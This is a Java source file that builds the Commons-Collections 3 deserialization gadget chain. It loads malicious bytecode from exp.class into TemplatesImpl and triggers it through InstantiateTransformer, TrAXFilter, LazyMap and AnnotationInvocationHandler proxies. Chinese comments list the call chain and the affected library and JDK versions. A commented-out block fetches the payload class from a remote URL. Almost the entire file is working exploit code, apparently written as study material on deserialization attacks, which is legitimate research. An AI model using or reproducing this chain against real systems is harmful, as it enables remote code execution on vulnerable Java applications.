import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Decoder;

import javax.xml.bind.DatatypeConverter;
import javax.xml.transform.Templates;
import java.io.*;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import util.Util;
public class CommonCollection3 {


/*调用链:
AnnotationInvocationHandler.readObject()
   Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                            TemplatesImpl.newTransformer()
 */
/*版本依赖:
commons-collections : 3.1～3.2.1
jdk < 7u21
 */
/*
* 加载的恶意类需要继承AbstractTranslet类，才可以
* */
    public static void main(String[] args) throws Exception{
        //核心代码,CC3只改变了最后执行代码的部分，不直接使用Runtime类，可以自定义Java代码执行。
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);

        //使用URL远程读取vpn上的文件，来执行恶意代码
//        URL remoteFileURL = new URL("http://127.0.0.1/exp.class");
//        // 打开远程文件的连接并获取输入流
//        URLConnection connection = remoteFileURL.openConnection();
//        InputStream inputStream = connection.getInputStream();
//        // 读取远程文件的内容到字节数组
//        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
//        int bytesRead;
//        byte[] data = new byte[1024];
//        while ((bytesRead = inputStream.read(data, 0, data.length)) != -1) {
//            buffer.write(data, 0, bytesRead);
//        }
//        buffer.flush();
//        byte[] remoteFileBytes = buffer.toByteArray();
//        inputStream.close();
//        byte[] code=remoteFileBytes;

        //读取本地文件
            byte[] code = Files.readAllBytes(Paths.get("exp.class"));
            byte[][] codes={code};
            bytecodefield.set(templates,codes);
            Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());


        //使用Template，TrAXFilter中newtranform
        InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        Transformer chainedTransformer=new ChainedTransformer(transformers);


        Map hashMap=new HashMap();
        LazyMap map=(LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler map_handler=(InvocationHandler) constructor.newInstance(Target.class,map);
        Map proxy_map=(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);
        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler=(InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Target.class,proxy_map);

        Util.serialize(handler);
        Util.unserialize();


    }
}
